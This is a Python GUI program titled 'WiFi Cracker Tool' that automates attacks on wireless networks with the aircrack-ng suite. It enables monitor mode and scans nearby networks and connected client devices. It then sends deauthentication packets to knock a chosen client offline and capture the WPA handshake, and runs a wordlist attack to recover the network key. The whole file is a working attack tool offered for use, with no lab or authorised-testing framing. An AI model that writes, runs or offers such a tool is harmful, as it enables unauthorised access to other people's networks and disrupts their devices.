import subprocess
import threading
import tkinter as tk
import time
import os
import glob
from tkinter import ttk, messagebox, filedialog


def is_monitor_mode_active():
    try:
        output = subprocess.check_output(["iwconfig"], stderr=subprocess.STDOUT, universal_newlines=True)
        return "Mode:Monitor" in output
    except Exception as e:
        messagebox.showerror("Error", f"Failed to check monitor mode status: {str(e)}")
        return False


def get_clients_for_bssid(bssid, channel):
    """Get list of client devices connected to the specified BSSID."""
    dump_command = ["airodump-ng", "--channel", channel, "--bssid", bssid, "wlan0mon", "--write", "/tmp/client_dump", "--output-format", "csv"]
    
    # Start airodump-ng in a separate thread
    process = subprocess.Popen(dump_command)
    
    # Let it run for a specific duration to capture client data
    time.sleep(10)

    # Terminate the process
    process.terminate()

    # Continue with the parsing logic
    try:
        # Find the latest file created by airodump-ng
        list_of_files = glob.glob('/tmp/client_dump*.csv') 
        latest_file = max(list_of_files, key=os.path.getctime)

        # Parse the dumped file
        with open(latest_file, 'r') as file:
            lines = file.readlines()

        clients = []
        for line in lines:
            parts = line.split(',')
            if len(parts) > 6 and bssid in parts[5].strip():  # Checking if the BSSID matches
                client_mac = parts[0].strip()
                clients.append(client_mac)
                
        return clients

    except Exception as e:
        messagebox.showerror("Error", f"Failed to fetch clients: {str(e)}")
        return []


def get_interfaces():
    """Get list of available wireless interfaces."""
    try:
        output = subprocess.check_output(["iwconfig"], stderr=subprocess.STDOUT, universal_newlines=True)
        interfaces = [line.split()[0] for line in output.split('\n') if "IEEE 802.11" in line]
        return interfaces
    except Exception as e:
        messagebox.showerror("Error", f"Failed to fetch interfaces: {str(e)}")
        return []


def refresh_interfaces():
    interfaces = get_interfaces()
    interface_combobox['values'] = interfaces
    if interfaces:
        interface_combobox.set(interfaces[0])

def start_monitor_mode():
    interface = interface_combobox.get()
    if not interface:
        messagebox.showinfo("Info", "No interface selected.")
        return

    try:
        subprocess.check_call(["airmon-ng", "start", interface])
        messagebox.showinfo("Info", f"Monitor mode enabled on {interface}mon.")
    except Exception as e:
        messagebox.showerror("Error", f"Failed to start monitor mode: {str(e)}")


def get_networks():
    """Get list of nearby Wi-Fi networks with SSID, BSSID, and Channel."""
    interface = interface_combobox.get()
    dump_command = ["airodump-ng", interface, "--write", "/tmp/airodump_output", "--output-format", "csv"]
    
    process = subprocess.Popen(dump_command)
    time.sleep(10)
    process.terminate()

    try:
        list_of_files = glob.glob('/tmp/airodump_output*.csv') 
        latest_file = max(list_of_files, key=os.path.getctime)

        with open(latest_file, 'r') as file:
            lines = file.readlines()

        networks = []
        for line in lines:
            parts = line.split(',')
            if len(parts) > 3 and ":" in parts[0]:
                ssid = parts[-2].strip()
                bssid = parts[0].strip()
                channel = parts[3].strip()
                networks.append((f"{ssid} {bssid} {channel}", bssid, channel))
                
        return networks

    except Exception as e:
        messagebox.showerror("Error", f"Failed to fetch networks: {str(e)}")
        return []


def scan_and_update_networks():
    """Scan for networks and update the dropdown."""
    networks = get_networks()

    # We only need the SSID, BSSID, and Channel combination for the dropdown, so we extract that
    display_values = [net[0] for net in networks]

    network_combobox['values'] = display_values
    if display_values:
        network_combobox.set(display_values[0])
    else:
        network_combobox.set("")



def scan_and_update_clients():
    """Scan for client devices of a selected network and update the dropdown."""
    selected_network = network_combobox.get()
    _, bssid, channel = selected_network.split(' ')

    clients = get_clients_for_bssid(bssid, channel)
    
    client_combobox['values'] = clients
    if clients:
        client_combobox.set(clients[0])
    else:
        client_combobox.set("")


def set_channel(interface, channel):
    try:
        subprocess.check_call(["iwconfig", interface, "channel", str(channel)])
    except subprocess.CalledProcessError as e:
        messagebox.showerror("Error", f"Failed to set channel: {str(e)}")


def capture_handshake_thread():
    selected_network = network_combobox.get()
    selected_client = client_combobox.get()
    _, bssid, channel = selected_network.split(' ')

    if not channel:
       messagebox.showerror("Error", "No Channel is selected.")
       return

    set_channel("wlan0mon", channel)
    
    try:
        # Start airodump-ng for capturing
        airodump_process = subprocess.Popen(["airodump-ng", "--channel", channel, "--bssid", bssid, "wlan0mon", "-w", "/tmp/handshake_capture"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

        # Send deauthentication packets and get the process
        deauth_process = subprocess.Popen(["aireplay-ng", "--deauth", "5", "-a", bssid, "-c", selected_client, "wlan0mon"])

        time.sleep(15)

        # Terminate the deauth process and airodump process
        deauth_process.terminate()
        airodump_process.terminate()

        root.after(0, lambda: messagebox.showinfo("Info", "Handshake should be captured. Check /tmp/handshake_capture files."))
    except Exception as e:
        root.after(0, lambda e=e: messagebox.showerror("Error", f"Failed to capture handshake: {str(e)}"))




def capture_handshake():
    threading.Thread(target=capture_handshake_thread, daemon=True).start()


def crack_password():
    handshake_file = filedialog.askopenfilename(title="Select the Handshake File", filetypes=(("cap files", "*.cap"), ("all files", "*.*")))
    
    # Decide on the cracking method based on selected protocol
    selected_protocol = protocol_combobox.get()
    if selected_protocol == "WEP":
        crack_command = ["aircrack-ng", "-a", "1", handshake_file, "-w", "/home/mininet/Desktop/wordlist.txt"]
    elif selected_protocol in ["WPA", "WPA2"]:
        crack_command = ["aircrack-ng", "-a", "2", handshake_file, "-w", "/home/mininet/Desktop/wordlist.txt"]
    else:
        messagebox.showerror("Error", "Invalid or unsupported protocol selected.")
        return
    
    try:
        output = subprocess.check_output(crack_command, universal_newlines=True)
        if "KEY FOUND!" in output:
            key = output.split("KEY FOUND! [")[1].split("]")[0]
            key_entry.configure(state='normal')
            key_entry.delete(0, tk.END)  # Clear previous values
            key_entry.insert(0, key) 
            key_entry.configure(state='readonly')
            messagebox.showinfo("Success", f"Key Found: {key}")
            for file in glob.glob("/tmp/handshake_capture*"):
                try:
                    os.remove(file)
                except:
                    root.after(0, lambda: messagebox.showwarning("Warning", f"Failed to delete {file}. Please remove it manually."))
        else:
            messagebox.showinfo("Info", "Key not found. Consider using a different wordlist.")
            for file in glob.glob("/tmp/handshake_capture*"):
                try:
                    os.remove(file)
                except:
                    root.after(0, lambda: messagebox.showwarning("Warning", f"Failed to delete {file}. Please remove it manually."))
    except Exception as e:
        messagebox.showerror("Error", f"Failed to crack password: {str(e)}")


        

root = tk.Tk()
root.title("WiFi Cracker Tool")

tk.Label(root, text="Select Wireless Interface:").pack(pady=5)
interface_combobox = ttk.Combobox(root, values=get_interfaces())
interface_combobox.pack(pady=5)
if get_interfaces():
    interface_combobox.set(get_interfaces()[0])

# Check if monitor mode is active
if not is_monitor_mode_active():
    monitor_button = ttk.Button(root, text="Start Monitor Mode", command=start_monitor_mode)
    monitor_button.pack(pady=10)

    refresh_button = ttk.Button(root, text="Refresh Interfaces", command=refresh_interfaces)
    refresh_button.pack(pady=5)

scan_button = tk.Button(root, text="Scan for Networks", command=scan_and_update_networks)
scan_button.pack(pady=10)

tk.Label(root, text="Select Network:").pack(pady=5)
network_combobox = ttk.Combobox(root, values=[], height=20, width=40)
network_combobox.pack(pady=5)


# Button to scan client devices connected to the selected AP
scan_clients_button = ttk.Button(root, text="Scan for Target Devices", command=scan_and_update_clients)
scan_clients_button.pack(pady=10)


tk.Label(root, text="Select Target Device:").pack(pady=5)
client_combobox = ttk.Combobox(root, values=[], height=20, width=40)
client_combobox.pack(pady=5)


capture_button = ttk.Button(root, text="Capture Handshake", command=capture_handshake)
capture_button.pack(pady=10)

tk.Label(root, text="Select Encryption Protocol:").pack(pady=5)
protocols = ['WEP', 'WPA', 'WPA2']
protocol_combobox = ttk.Combobox(root, values=protocols, state="readonly")
protocol_combobox.pack(pady=5)
protocol_combobox.set('WPA2')

crack_button = ttk.Button(root, text="Crack Password", command=crack_password)
crack_button.pack(pady=10)

tk.Label(root, text="Cracked Key:").pack(pady=5)
key_entry = tk.Entry(root, state="readonly")
key_entry.pack(pady=5)

root.mainloop()

